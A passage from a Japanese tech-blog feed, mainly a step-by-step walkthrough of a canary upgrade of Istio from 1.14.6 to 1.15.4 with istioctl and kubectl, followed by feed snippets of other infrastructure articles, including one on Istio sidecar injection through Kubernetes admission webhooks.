を深ぼっていきます。今回は、ドキュメントで一番優先して記載されている istioctl コマンドを使用した手順 を説明します。なお各番号は、04. アップグレード手法の概要 の (1) 〜 (8) に対応しています。▶︎ アップグレードに使用するツールについてistioctlコマンド以外のツール (例：helmコマンド、helmfileコマンド、ArgoCD) を使用してもアップグレードできます。細かな手順が異なるだけで、アップグレード手法の概要は同じです\uD83D\uDE46\uD83C\uDFFB‍前提Namespaceまず最初に、前提となる状況を設定しておきます。各Namespaceのistio.io/revラベルにdefaultが設定されているとします。$ kubectl get namespace -L istio.io/revNAME              STATUS   AGE   REVfoo               Active   34d   defaultbar               Active   34d   defaultbaz               Active   34d   defaultistio-ingress     Active   34d   default...▶︎ istio.io/revラベル値のエイリアスについてistio.io/revラベル値は、どんなエイリアスでもよいです。よくあるエイリアスとしてdefaultやstableを使用します\uD83D\uDC4Dさらに、マニフェストに書き起こすと以下のようになっています。apiVersion: v1kind: Namespacemetadata:  name: foo  labels:    istio.io/rev: defaultこのistio.io/revラベルがあることにより、そのNamespaceのPodにistio-proxyコンテナを自動的にインジェクションします。▶︎ istio-proxyコンテナのインジェクションの仕組みについてについてistio-proxyコンテナのインジェクションの仕組みについては、今回言及しておりません。以下の記事で解説していますため、もし気になる方はよろしくどうぞ\uD83D\uDE47\uD83C\uDFFB‍Istiodすでに1-14-6のIstiodが動いており、1-15-4にカナリアアップグレードします。IstiodはDeployment配下のPodであり、このPodはIstiodの実体であるdiscoveryコンテナを持ちます。$ kubectl get deployment -n istio-system -l app=istiodNAME                   READY   UP-TO-DATE   AVAILABLE   AGEistiod-1-14-6          1/1     1            1           47s # 1-14-6Istio IngressGatewayIstio IngressGatewayはIstiodとは異なるNamespaceで動いており、インプレースアップグレードします。Istio IngressGatewayはistio-proxyコンテナを持ちます。$ kubectl get deployment -n istio-ingressNAME                   READY   UP-TO-DATE   AVAILABLE   AGEistio-ingressgateway   1/1     1            1           47s▶︎ IstiodとIstio IngressGatewayを動かすNamespaceについてIstio / Installing Gatewaysマイクロサービス各Namespaceでマイクロサービスが動いています。マイクロサービスのPodはistio-proxyコンテナを持ちます。$ kubectl get deployment -n fooNAME   READY   UP-TO-DATE   AVAILABLE   AGEfoo    2/2     1            1           47s...$ kubectl get deployment -n barNAME   READY   UP-TO-DATE   AVAILABLE   AGEbar    2/2     1            1           47s..$ kubectl get deployment -n bazNAME   READY   UP-TO-DATE   AVAILABLE   AGEbaz    2/2     1            1           47s...(1) アップグレード前の検証ここで実施することアップグレード前に、現在のKubernetes Clusterがアップグレード要件を満たしているかを検証します。Before you upgradeistioctl x precheckコマンドistioctl x precheckコマンドを実行し、アップグレード要件を検証します。問題がなければ、istioctlコマンドはNo issue ...の文言を出力します。$ istioctl x precheck✅ No issues found when checking the cluster.Istiois safe to install or upgrade!  To get started, check out https://istio.io/latest/docs/setup/getting-started/▶︎ アップグレード要件が満たない場合についてistioctl x precheckコマンドはエラー文言を出力します。例えば、Istioのistio-proxyコンテナのインジェクションではkube-apiserverと通信する必要があります。そのため、kube-apiserverのバージョンが古すぎるせいでIstioが非対応であると、エラーになります\uD83D\uDE2Dkubectl getコマンド▼ IstiodのDeploymentkubectl getコマンドを実行し、現在のIstiodのバージョンを確認します\uD83D\uDC40まずはIstiodのDeploymentを確認すると、1-14-6のDeploymentがあります。$ kubectl get deployment -n istio-system -l app=istiodNAME                   READY   UP-TO-DATE   AVAILABLE   AGEistiod-1-14-6          1/1     1            1           47s # 1-14-6istio-proxyコンテナのインジェクションの仕組みでいうと、以下の赤枠の要素です\uD83D\uDC47▼ Webhookの宛先のService次に、 Serviceを確認すると、1-14-6のServiceがあります。$ kubectl get service -n istio-system -l app=istiodNAME            TYPE        CLUSTER-IP       EXTERNAL-IP   PORT(S)                                 AGEistiod-1-14-6   ClusterIP   10.96.93.151     <none>        15010/TCP,15012/TCP,443/TCP,15014/TCP   109s # 1-14-6このServiceは、kube-apiserverからIstiodへのWebhookを仲介することにより、istio-proxyコンテナのインジェクションを可能にします。istio-proxyコンテナのインジェクションの仕組みでいうと、以下の赤枠の要素です\uD83D\uDC47▼ 宛先のServiceを決めるMutatingWebhookConfiguration最後に、MutatingWebhookConfigurationを確認すると、istio-revision-tag-<エイリアス>とistio-sidecar-injector-<リビジョン番号>のMutatingWebhookConfigurationがあります。$ kubectl get mutatingwebhookconfigurationsNAME                            WEBHOOKS   AGEistio-revision-tag-default      2          114s  # カナリアアップグレード用istio-sidecar-injector-1-14-6   2          2m16s # インプレースアップグレード用のため今回は言及しないistio-proxyコンテナのインジェクションの仕組みでいうと、以下の赤枠の要素です\uD83D\uDC47これらのうち、前者 (istio-revision-tag-<エイリアス>) をカナリアアップグレードのために使用します。このMutatingWebhookConfigurationは、Webhookの宛先のServiceを決めるため、結果的にistio-proxyコンテナのバージョンを決めます。ここで、MutatingWebhookConfigurationのistio.io/revラベルとistio.io/tagラベルの値も確認しておきます。$ kubectl get mutatingwebhookconfiguration istio-revision-tag-default -o yaml \\\\    | yq \'.metadata.labels\'...istio.io/rev: 1-14-6istio.io/tag: default...istio.io/revラベルはIstiodのバージョン、istio.io/tagラベルはこれのエイリアスを表しています。また、.webhooks[].namespaceSelectorキー配下のistio.io/revキーの検知ルールを確認します。$ kubectl get mutatingwebhookconfiguration istio-revision-tag-default -o yaml \\\\    | yq \'.webhooks[]\'...namespaceSelector:  matchExpressions:    - key: istio.io/rev      operator: In      values:        - default...合わせて、.webhooks[].clientConfig.serviceキー配下のServiceを名前を確認します。$ kubectl get mutatingwebhookconfiguration istio-revision-tag-default -o yaml \\\\    | yq \'.webhooks[].clientConfig\'...service:  name: istiod-1-14-6...▶︎ MutatingWebhookConfigurationの役割についてistio.io/revラベルにdefaultを設定してあるとします。すると、上記のMutatingWebhookConfigurationがこれを検知します。MutatingWebhookConfigurationにはdefaultに対応するIstioのリビジョンが定義されており、kube-apiserverが特定のIstioのバージョンのServiceにWebhookを送信可能になります\uD83C\uDF89Istio / Safely upgrade the Istio control plane with revisions and tags(2) 新Istiodのインストールここで実施することそれでは、新Istiodをインストールします。Control planeistioctl versionコマンド新しくインストールするIstiodのバージョンは、istioctlコマンドのバージョンで決まります。そこで、istioctl versionコマンドを実行し、これのバージョンを確認します。$ istioctl versionclient version: 1.15.4        # アップグレード先のバージョンcontrol plane version: 1.14.6 # 現在のバージョンdata plane version: 1.14.6istioctl installコマンドカナリアアップグレードの場合、istioctl installコマンドを実行します。ドキュメントではrevisionキーの値がcanaryですが、今回は1-15-4とします。この値は、Istioが使用する様々なKubernetesリソースの接尾辞や、各リソースのistio.io/revラベルの値になります。$ istioctl install --set revision=1-15-4WARNING: Istio is being upgraded from 1.14.6 -> 1.15.4WARNING: Before upgrading, you may wish to use \'istioctl analyze\' to check for IST0002 and IST0135 deprecation warnings.✅ Istio core installed✅ Istiod installed✅ Ingress gateways installed✅ Installation completeThank you for installing Istio 1.15.  Please take a few minutes to tell us about your install/upgrade experience!▶︎ カナリアアップグレードで指定できるバージョン差についてrevisionキーを使用したカナリアアップグレードでは、2つの先のマイナーバージョンまでアップグレードできます。例えば、現在のIstioが1.14.6であるなら、1.16系まで対応しています\uD83D\uDC4DIstio / Canary Upgradeskubectl getコマンド▼ IstiodのDeploymentkubectl getコマンドを実行し、istioctl installコマンドで何をインストールしたのかを確認します\uD83D\uDC40まずはIstiodのDeploymentを確認すると、1-15-4というDeploymentが新しく増えています。$ kubectl get deployment -n istio-system -l app=istiodNAME            READY   UP-TO-DATE   AVAILABLE   AGEistiod-1-14-6   1/1     1            1           47s # 1-14-6istiod-1-15-4   1/1     1            1           47s # 1-15-4接尾辞の1-15-4は、revisionキーの値で決まります。この段階では、旧Istiodと新Istioが並行的に稼働しており、kube-apiserverはまだ旧Istiodと通信しています今の状況は以下の通りです\uD83D\uDC47▼ Webhookの宛先のService次に Webhookの宛先のServiceを確認すると、istiod-1-15-4というServiceが新しく増えています。$ kubectl get service -n istio-system -l app=istiodNAME            TYPE        CLUSTER-IP       EXTERNAL-IP   PORT(S)                                 AGEistiod-1-14-6   ClusterIP   10.96.93.151     <none>        15010/TCP,15012/TCP,443/TCP,15014/TCP   109s # 1-14-6istiod-1-15-4   ClusterIP   10.104.186.250   <none>        15010/TCP,15012/TCP,443/TCP,15014/TCP   87s  # 1-15-4この段階では、まだWebhookの宛先はistiod-1-14-6のServiceです。今の状況は以下の通りです\uD83D\uDC47▼ Webhookの宛先のServiceを決めるMutatingWebhookConfiguration最後にMutatingWebhookConfigurationを確認すると、istio-sidecar-injector-1-15-4というMutatingWebhookConfigurationが新しく増えています。$ kubectl get mutatingwebhookconfigurationsNAME                            WEBHOOKS   AGEistio-revision-tag-default      2          114s  # カナリアアップグレードで使用するistio-sidecar-injector-1-14-6   2          2m16sistio-sidecar-injector-1-15-4   2          2m16sカナリアアップグレードでは、istio-revision-tag-<エイリアス>のMutatingWebhookConfigurationを使用します。今の状況は以下の通りです\uD83D\uDC47▶︎ アンインストールについて(3) Webhookの宛先のServiceの変更ここで実施することこの手順では、エイリアスのistio.io/tagラベルの値はそのままにしておき、一方でistio.io/revラベルの値を変更します。さらに、Webhookの宛先のServiceを変更します。Default tagSafely upgrade the Istio control plane with revisions and tagsistioctl tag setコマンドistioctl tag setコマンドを実行し、istio.io/revラベルの値と宛先のServiceを変更します。$ istioctl tag set default --revision 1-15-4 --overwrite実行後に、もう一度MutatingWebhookConfigurationを確認すると、istio.io/revラベルの値が変わっています。$ kubectl get mutatingwebhookconfiguration istio-revision-tag-default -o yaml \\\\    | yq \'.metadata.labels\'...istio.io/rev: 1-15-4istio.io/tag: default...また、Webhookの宛先のServiceも変わっています。$ kubectl get mutatingwebhookconfiguration istio-revision-tag-default -o yaml \\\\    | yq \'.webhooks[].clientConfig\'...service:  name: istiod-1-15-4...これらにより、Webhookの宛先が 1-15-4 のService となります。そのため、 1-15-4 の istio-proxy コンテナをインジェクションできる ようになります。今の状況は以下の通りです\uD83D\uDC47(4) Istio IngressGatewayをインプレースアップグレードここで実施することWebhookの宛先が1-15-4のServiceに変わったところで、Istio IngressGatewayをインプレースアップグレードします。In place upgradekubectl rollout restartコマンドkubectl rollout restartコマンドを実行し、Istio IngressGatewayをインプレースアップグレードします。$ kubectl rollout restart deployment istio-ingressgateway-n istio-ingress再作成したPodのイメージを確認してみると、istio-proxyコンテナを1-15-4にアップグレードできています。$ kubectl get pod bar -n bar -o yaml | yq \'.spec.containers[].image\'docker.io/istio/proxyv2:1.15.4 # istio-proxyコンテナ▶︎ istioctl proxy-statusコマンドについてkubectl getコマンドの代わりに、istioctl proxy-statusコマンドを使用して、アップグレードの完了を確認してもよいです。今の状況は以下の通りです\uD83D\uDC47▶︎ Istio IngressGatewayの通信遮断について(5) 一部のNamespaceのistio-proxyコンテナをアップグレードここで実施すること続けて、一部のNamespaceのistio-proxyコンテナをアップグレードします。Podの再作成により、新Istiodのistio-proxyコンテナがインジェクションされるため。istio-proxyコンテナをアップグレードできます。Data planekubectl rollout restartコマンド前提にあるように、Namespaceには foo bar baz があります。kubectl rollout restartコマンドを実行し、barのistio-proxyコンテナからアップグレードします。$ kubectl rollout restart deployment bar -n bar再作成したPodのイメージを確認してみると、istio-proxyコンテナを1-15-4にアップグレードできています。$ kubectl get pod bar -n bar -o yaml | yq \'.spec.containers[].image\'bar-app:1.0 # マイクロサービスdocker.io/istio/proxyv2:1.15.4 # istio-proxyコンテナ▶︎ istioctl proxy-statusコマンドについてkubectl getコマンドの代わりに、istioctl proxy-statusコマンドを使用して、アップグレードの完了を確認してもよいです。今の状況は以下の通りです\uD83D\uDC47(6) ユーザの手を借りたテストここで実施することIstioを部分的にアップグレードしたところで、アップグレードが完了したNamespaceをテストします。ユーザーの手を借りて実地的にテストします (例：該当のエラーメトリクスが基準値を満たすか) 。今の状況は以下の通りです\uD83D\uDC47もし問題が起こった場合もし問題が起こった場合、1-14-6にダウングレードしていきます。istioctl tag setコマンドを実行し、istio.io/revラベルの値を元に戻します。$ istioctl tag set default --revision 1-14-6 --overwriteその後、kubectl rollout restartコマンドの手順を実行し、istio-proxyコンテナをダウングレードしてきます。(7) istio-proxyコンテナの段階的アップグレードここで実施すること先ほどのNamespaceで問題が起こらなければ、残ったNamespace (foo、baz、...) のistio-proxyコンテナも段階的にアップグレードしていきます。kubectl rollout restartコマンド同様にkubectl rollout restartコマンドを実行し、istio-proxyコンテナからアップグレードします。$ kubectl rollout restart deployment foo -n foo$ kubectl rollout restart deployment baz -n baz...最終的に、全てのNamespacemのistio-proxyコンテナが新しくなります。今の状況は以下の通りです\uD83D\uDC47(8) 旧Istiodのアンインストールここで実施すること最後に、旧Istiodのアンインストールします。Uninstall old control planeistioctl uninstallコマンドistioctl uninstallコマンドを実行し、旧Istiodをアンインストールします。$ istioctl uninstall --revision 1-14-6✅ Uninstall complete今の状況は以下の通りです\uD83D\uDC47kubectl getコマンド▼ IstiodのDeploymentkubectl getコマンドを実行し、istioctl uninstallコマンドで何をアンインストールしたのかを確認します\uD83D\uDC40まずはIstiodのDeploymentを確認すると、1-14-6というDeploymentが無くなっています。$ kubectl get deployment -n istio-system -l app=istiodNAME            READY   UP-TO-DATE   AVAILABLE   AGEistiod-1-15-4   1/1     1            1           47s # 1-15-4▼ Webhookの宛先のService次に Webhookの宛先のServiceを確認すると、istiod-1-14-6というServiceが無くなっています。$ kubectl get service -n istio-system -l app=istiodNAME            TYPE        CLUSTER-IP       EXTERNAL-IP   PORT(S)                                 AGEistiod-1-15-4   ClusterIP   10.104.186.250   <none>        15010/TCP,15012/TCP,443/TCP,15014/TCP   87s  # 1-15-4▼ 宛先のServiceを決めるMutatingWebhookConfiguration最後にMutatingWebhookConfigurationを確認すると、istio-sidecar-injector-1-14-6というMutatingWebhookConfigurationが無くなっています。$ kubectl get mutatingwebhookconfigurationsNAME                            WEBHOOKS   AGEistio-revision-tag-default      2          114s  # 次のカナリアアップグレードでも使用するistio-sidecar-injector-1-15-4   2          2m16sこれで、新Istiodに完全に入れ替わったため、アップグレードは完了です。今の状況は以下の通りです\uD83D\uDC47▶︎ アンインストールについて06. おわりにIstioを安全にアップグレードするカナリア方式とその仕組みをもりもり布教しました。Istioへの愛が溢れてしまいました。これからIstioを採用予定の方は、Istioを安全にアップグレードするために十分に準備しておくことをお勧めします\uD83D\uDC4D記事関連のおすすめ書籍Istio in Action (English Edition)作者:Posta, Christian E.,Maloku, RinorManningAmazonIstio: Up and Running: Using a Service Mesh to Connect, Secure, Control, and Observe作者:Calcote, Lee,Butcher, ZackO\'Reilly MediaAmazon","isoDate":"2023-02-26T11:25:48.000Z","dateMiliSeconds":1677410748000,"authorName":"長谷川 広樹","authorId":"hiroki-hasegawa"},{"title":"LINE に送ったメッセージを Google Home に読み上げさせる","link":"https://blog.1q77.com/2023/02/line-bot-tts/","contentSnippet":"令和の時代、家に固定電話はなく、外出先から家族に直ぐに答えて欲しいことがあってもスマホはマナーモードで手元に置いてなければ気づくことができません。","isoDate":"2023-02-25T12:51:58.000Z","dateMiliSeconds":1677329518000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"Caddy の Internal TLS 証明書の有効期間を指定する","link":"https://blog.1q77.com/2023/02/caddy-internal-tls-cert-lifetime/","contentSnippet":"以前 ワンライナーで https の Reverse Proxy を実行する という記事で Caddy を使うと local での開発用に任意のドメインの証明書を簡単に発行できるし CA の証明書も OS の証明書ストアに保存してくれるため、ブラウザでアクセスしても警告が出なくて便利というのを書きました。","isoDate":"2023-02-09T14:29:32.000Z","dateMiliSeconds":1675952972000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"2023年の目標","link":"https://moz-security.hatenablog.com/entry/2023/02/01/112627","contentSnippet":"前回のブログで「近々、新年の抱負として、今年やりたいことを書きたいと思っています。」と書いておきながら、もう少しで１ヶ月が経ってしまいます。（近々とは？って感じですけど 笑）１月は、大学のテストと溜まりに溜まった課題で手一杯でしたが、1月31日でそれも終わり、ひと段落したため、今年の目標について書いていこうと思います。目標は大きく4つあります。1つ目は、大学の研究です。これは目標というよりも、頑張ることになってますね。どれだけ独学で勉強しても、趣味でいろいろシステム開発しても、まずは大学を卒業しなければ、学士にはなれないため、これは間違いなく最優先で行わなければいけません。大学の授業としても、あと残っているのが卒業研究だけであるため、今年大学でやること・頑張ることはこれだけかなと思います。大学に行って、ひたすら研究、研究、研究になる気がします。2つ目は、Hack The BoxでHackerランクになることです。昨年の3月ごろからHack The Boxを始めて、時間があるときに取り組んでいましたが、Starting Pointのいろいろな箇所で詰まったり、そもそも時間を十分に取れなかったりして、あまり攻略できていませんでした。今年は、授業もあまりなく、時間も取れそうなため、本腰を入れて頑張りたいと思います。具体的な数字でいうと、少なくとも毎日１時間、朝８時〜９時までをHack The Boxを攻略する時間に当てようと思っています。理想は、2時間、3時間、時間が取れるならそれよりもという感じなんですけど、日によっては、忙しい日もあるので、そんな日でも取れそうな最低限の1時間にしました。こういうのは1日に頑張りすぎるよりも、継続することが大事だと思うので、毎日コツコツやっていきたいと思います。将来的にはセキュリティ関連の仕事をしたいため、攻撃を通して防御を学び、防御を通して攻撃を学んでいきたいと思います。3つ目は、資格の取得です。今まで、基本情報技術者、応用情報技術者を取ってきたため、今年は、情報処理安全確保支援士に挑戦したいと思っています。資格は、知識問題でしかないから、社会では使えないという意見もあり、自分でも知識(知っていること) とスキル(できること)は違うと思っているため、半分は同意できるのですが、一方で、資格を取るために勉強するというこの資格を取るまでの過程が大事だとも思っています。また、幅広く体系的な知識を習得できるというのも資格取得のメリットだと思っています。情報処理安全確保支援士取得に向けて、これから頑張りたいと思います。4つ目は、学外のイベントに参加することです。セキュリティキャンプやSecHack365といったセキュリティ関連のイベントに加え、ハッカソンやカンファレンスにも参加していきたいと思っています。前までは、自分のスキルでは学外イベントに参加するのは恥ずかしいと思い、挑戦できていなかったのですが、昨年、ハッカソンやセキュリティ・ミニキャンプに参加することで、参加する人全員がすごい人ではなく、自分と似たような人もいるし、イベントを通して、成長したいという人がたくさんいることも知りました。今年は、昨年に引き続き、より多くのイベントに参加し、成長できる環境に自分から臨んでいきたいと思います。1月も終わり、今年もあと11ヶ月になりましたが、いろいろな経験をして、たくさんの人に出会い、成長できたと言える1年にしていきたいと思います。","isoDate":"2023-02-01T02:26:27.000Z","dateMiliSeconds":1675218387000,"authorName":"Kobayashi Shun","authorId":"moz-sec"},{"title":"GitLabで指定したグループ内の全てのリポジトリを一括でcloneする","link":"https://zenn.dev/tayusa/articles/ae5911391c9440","contentSnippet":"概要1個1個丹精込めて手動でcloneすることに限界を感じたので、一括で自分に関連するリポジトリをcloneする シェルスクリプト.zshrc# リポジトリのディレクトリを作成してからcloneする# 第1引数 URL(https://gitlab.example.com/diaspora/diaspora-client.git)function git_clone_to_path() {  [[ -z ${commands[git]} ]] \\\\    && { echo \'git is required\'; return 1; }  loca...","isoDate":"2023-01-29T17:07:31.000Z","dateMiliSeconds":1675012051000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"ArtifactHUBについてのメモ","link":"https://zenn.dev/bells17/articles/artifacthub-note","contentSnippet":"ArtifactHUB というコンテナイメージHelm Chartなどを登録・検索することのできるツールを試してみたのでメモ。https://artifacthub.io/ ArtifactHUB についてコンテナイメージHelm Chartなどを「リポジトリ」として登録・検索することができるよう。登録できるリポジトリの種類は下記で確認できる。https://artifacthub.io/docs/topics/repositories/アカウント登録方法は現在下記の3つがあるemailgithubgoogle リポジトリの登録リポジトリ登...","isoDate":"2023-01-21T18:21:58.000Z","dateMiliSeconds":1674325318000,"authorName":"bells17","authorId":"bells17"},{"title":"container-structure-testによるコンテナのテスト","link":"https://zenn.dev/bells17/articles/container-structure-test","contentSnippet":"Googleが作成しているcontainer-structure-testというコンテナをテストするツールを試したのでメモ。かなり単純なツールなのでぶっちゃけREADMEに書いてあることを読めばわかるんだけど一応情報をまとめた。https://github.com/GoogleContainerTools/container-structure-testGoogleのブログで紹介されている記事はこちら。https://opensource.googleblog.com/2018/01/container-structure-tests-unit-tests.html cont...","isoDate":"2023-01-21T10:54:17.000Z","dateMiliSeconds":1674298457000,"authorName":"bells17","authorId":"bells17"},{"title":"【Istio⛵️】サービスメッシュの登場経緯とIstioサイドカーインジェクションの仕組み","link":"https://hiroki-hasegawa.hatenablog.jp/entry/2023/01/14/223815","contentSnippet":"この記事から得られる知識この記事を読むと、以下を \\"完全に理解\\" できます✌️代表的なサービスメッシュの種類についてIstioのサイドカーインジェクションの仕組みについてこの記事から得られる知識01. はじめに02. サービスメッシュが登場した経緯なぜサービスメッシュが登場したのかサービスメッシュのモデルサイドカープロキシメッシュ03. admission-controllersアドオンについてadmission-controllersアドオンとはadmissionプラグインの種類MutatingAdmissionWebhookプラグインMutatingAdmissionWebhookプラグインとはAdmissionReview、AdmissionRequest、AdmissionResponse▼ AdmissionReview▼ AdmissionRequest▼ AdmissionResponse04. サイドカーインジェクションの仕組み全体のフロークライアント ➡︎ kube-apiserverここで説明するフロー箇所(1) Podの作成をリクエストkube-apiserver ➡︎ Serviceここで説明するフロー箇所(2) 認証/認可処理をコール(3) アドオンの処理をコール(4) AdmissionRequestに値を詰める(5) AdmissionReviewを送信Service ➡︎ webhookサーバーここで説明するフロー箇所(6) 15017番ポートにポートフォワーディングkube-apiserver ⬅︎ Service ⬅︎ webhookサーバー (※逆向きの矢印)ここで説明するフロー箇所(7) patch処理を定義(8) AdmissionResponseに値を詰める(9) AdmissionReviewを返信kube-apiserver ➡︎ etcdここで説明するフロー箇所(10) patch処理をコール(11) マニフェストを永続化クライアント ⬅︎ kube-apiserverここで説明するフロー箇所(12) コール完了を返信以降の仕組み05. おわりに記事関連のおすすめ書籍01. はじめに推し (Istio) が尊い\uD83D\uDE4F\uD83D\uDE4F\uD83D\uDE4Fさて、前回の記事の時と同様に、最近の業務でもオンプレとAWS上のIstio⛵️をひたすら子守りしています。今回は、子守りの前提知識の復習もかねて、サービスメッシュを実装するIstioサイドカーインジェクションを記事で解説しました。解説するのは、執筆時点 (2023/01/14) 時点で最新の 1.14 系のIstioです。執筆時点 (2023/01/14) では、Istioが実装するサービメッシュには、『サイドカープロキシメッシュ』と『アンビエントメッシュ』があります。サイドカープロキシメッシュの仕組みの軸になっているものは、サイドカーコンテナであるistio-proxyコンテナです。Istioは、KubernetesのPodの作成時に、istio-proxyコンテナをPod内に自動的にインジェクション (注入) しますそれでは、もりもり布教していきます\uD83D\uDE1702. サービスメッシュが登場した経緯なぜサービスメッシュが登場したのかそもそも、なぜサービスメッシュが登場したのでしょうか。マイクロサービスアーキテクチャのシステムには、アーキテクチャ固有のインフラ領域の問題 (例：サービスディスカバリーの必要性、マイクロサービス間通信の暗号化、テレメトリー作成など) があります。アプリエンジニアが各マイクロサービス内にインフラ領域の問題に関するロジックを実装すれば、これらの問題の解決できます。しかし、アプリエンジニアはアプリ領域の問題に責務を持ち、インフラ領域の問題はインフラエンジニアで解決するようにした方が、互いに効率的に開発できます。そこで、インフラ領域の問題を解決するロジックをサイドカーとして切り分けます。これにより、アプリエンジニアとインフラエンジニアの責務を分離可能になり、凝集度が高くなります。また、インフラ領域の共通ロジックをサイドカーとして各マイクロサービスに提供できるため、単純性が高まります。こういった流れの中で、サービスメッシュが登場しました。servicemesh.es | Service Mesh ComparisonWhat is Service Mesh and why is it needed in Kubernetes?サービスメッシュのモデル前述の通り、サービスメッシュの登場前は、アプリエンジニアが各マイクロサービス内にインフラ領域の問題に関するロジックを実装していました。これを、『共有ライブラリモデル』と呼びます。その後、『サイドカーモデル』とも呼ばれるサイドカープロキシメッシュが登場しました。執筆時点 (2023/01/14) では、『カーネルモデル』とも呼ばれるサイドカーフリーメッシュが登場しています。サイドカープロキシメッシュIstioのサイドカーによるサービスメッシュ (サイドカープロキシメッシュ) は、サイドカーコンテナ (istio-proxyコンテナ) が稼働するデータプレーンサイドカーを中央集権的に管理するIstiod (discoveryコンテナ) が稼働するコントロールプレーンからなります。Istio / Architecture03. admission-controllersアドオンについてadmission-controllersアドオンとはIstioのPod内へのサイドカーインジェクションの前提知識として、admission-controllersアドオンを理解する必要があります。もし、admission-controllersアドオンをご存知の方は、 04. サイドカーインジェクションの仕組み まで飛ばしてください\uD83D\uDE47\uD83C\uDFFB‍kube-apiserverでは、admission-controllersアドオンを有効化できます。有効化すると、認証ステップと認可ステップの後にmutating-admissionステップとvalidating-admissionステップを実行でき、admissionプラグインの種類に応じた処理を挿入できます。クライアント (kubectlクライアント、Kubernetesリソース) からのリクエスト (例：Kubernetesリソースに対する作成/更新/削除、kube-apiserverからのプロキシへの転送) 時に、各ステップでadmissionプラグインによる処理 (例：アドオンビルトイン処理、独自処理) を発火させられます。Admission Control in Kubernetes | KubernetesKubernetes Best Practices: Blueprints for Building Successful Applications on Kubernetesadmissionプラグインの種類admission-controllersアドオンのadmissionプラグインには、たくさんの種類があります。IstioがPod内にサイドカーをインジェクションする時に使用しているアドオンは、『MutatingAdmissionWebhook』です。CertificateApprovalCertificateSigningCertificateSubjectRestrictionDefaultIngressClassDefaultStorageClassDefaultTolerationSecondsLimitRanger\\"MutatingAdmissionWebhook\\" \uD83D\uDC48 これNamespaceLifecyclePersistentVolumeClaimResizePodSecurityPriorityResourceQuotaRuntimeClassServiceAccountStorageObjectInUseProtectionTaintNodesByConditionValidatingAdmissionWebhookAdmission Control in Kubernetes | KubernetesMutatingAdmissionWebhookプラグインMutatingAdmissionWebhookプラグインとはMutatingAdmissionWebhookプラグインを使用すると、mutating-admissionステップ時に、リクエスト内容を変更する処理をフックできます。フックする具体的な処理として、webhookサーバーにAdmissionRequestリクエストとして送信することにより、レスポンスのAdmissionResponseに応じてリクエスト内容を動的に変更します。MutatingWebhookConfigurationで、MutatingAdmissionWebhookプラグインの発火条件やwebhookサーバーの宛先情報を設定します。MutatingWebhookConfigurationの具体的な実装については、サイドカーインジェクションの仕組みの中で説明していきます。Diving into Kubernetes MutatingAdmissionWebhook | by Morven Cao | IBM Cloud | MediumKubernetes Admission Webhook覚書き - gashirar\'s blogAdmission Webhookを作って遊んで、その仕組みを理解しよう（説明編）AdmissionReview、AdmissionRequest、AdmissionResponse▼ AdmissionReviewAdmissionReviewは以下のようなJSONであり、kube-apiserverとwebhookサーバーの間でAdmissionRequestとAdmissionResponseを運びます。{  \\"apiVersion\\": \\"admission.k8s.io/v1\\",  \\"kind\\": \\"AdmissionReview\\",  # AdmissionRequest  \\"request\\": {},  # AdmissionResponse  \\"response\\": {},}v1 package - k8s.io/api/admission/v1 - Go Packages▼ AdmissionRequestAdmissionRequestは以下のようなJSONです。kube-apiserverがクライアントから受信した操作内容が持つことがわかります。例で挙げたAdmissionRequestでは、クライアントがDeploymentをCREATE操作するリクエストをkube-apiserverに送信したことがわかります。{  \\"apiVersion\\": \\"admission.k8s.io/v1\\",  \\"kind\\": \\"AdmissionReview\\",  # AdmissionRequest  \\"request\\": {    ...    # 変更されるKubernetesリソースの種類を表す。    \\"resource\\": {      \\"group\\": \\"apps\\",      \\"version\\": \\"v1\\",      \\"resource\\": \\"deployments\\"    },    # kube-apiserverの操作の種類を表す。    \\"operation\\": \\"CREATE\\",    ...  }}Dynamic Admission Control | Kubernetes▼ AdmissionResponse一方でAdmissionResponseは、例えば以下のようなJSONです。AdmissionResponseは、マニフェスト変更処理をpatchキーの値に持ち、これはbase64方式でエンコードされています。{  \\"apiVersion\\": \\"admission.k8s.io/v1\\",  \\"kind\\": \\"AdmissionReview\\",  # AdmissionResponse  \\"response\\": {      \\"uid\\": \\"<value from request.uid>\\",      # 宛先のwebhookサーバーが受信したか否かを表す。      \\"allowed\\": true,      # PathによるPatch処理を行う。      \\"patchType\\": \\"JSONPatch\\",      # Patch処理の対象となるKubernetesリソースと処理内容を表す。base64方式でエンコードされている。      \\"patch\\": \\"W3sib3AiOiAiYWRkIiwgInBhdGgiOiAiL3NwZWMvcmVwbGljYXMiLCAidmFsdWUiOiAzfV0=\\",    },}エンコード値をデコードしてみると、例えば以下のようなpatch処理が定義されています。# patchキーをbase64方式でデコードした場合[{\\"op\\": \\"add\\", \\"path\\": \\"/spec/replicas\\", \\"value\\": 3}]マニフェストに対する操作 (op) 、キー (path) 、値 (value) が設定されています。kube-apiserverがこれを受信すると、指定されたキー (.spec.replicas) に値 (3) に追加します。Dynamic Admission Control | Kubernetes04. サイドカーインジェクションの仕組み全体のフロー前提知識を踏まえた上で、admission-controllersアドオンの仕組みの中で、サイドカーのistio-proxyコンテナがどのようにPodにインジェクションされるのかを見ていきましょう。最初に、サイドカーインジェクションのフローは以下の通りになっています。(画像はタブ開き閲覧を推奨)Istio in Action (English Edition)クライアント ➡︎ kube-apiserverここで説明するフロー箇所『クライアント ➡︎ kube-apiserver』の箇所を説明します。(画像はタブ開き閲覧を推奨)(1) Podの作成をリクエストまずは、クライアントがkube-apiserverにリクエストを送信するところです。クライアント (Deployment、DaemonSet、StatefulSet、を含む) は、Podの作成リクエストをkube-apiserverに送信します。この時のリクエスト内容は、以下の通りとします。# Podを作成する。$ kubectl apply -f foo-pod.yaml# foo-pod.yamlファイルapiVersion: v1kind: Podmetadata:  name: foo-pod  namespace: foo-namespacespec:  containers:    - name: foo      image: foo:1.0.0      ports:        - containerPort: 80またNamespaceでは、あらかじめistio-proxyコンテナのインジェクションが有効化されているとします。Istioではv1.10以降、リビジョンの番号のエイリアスを使用して、istio-proxyコンテナのインジェクションを有効化するようになりました。apiVersion: v1kind: Namespacemetadata:  name: foo-namespace  labels:    # istio-proxyコンテナのインジェクションを有効化する。    # エイリアスは自由    istio.io/rev: <エイリアス>Istio / Announcing Support for 1.8 to 1.10 Direct Upgrades▶ 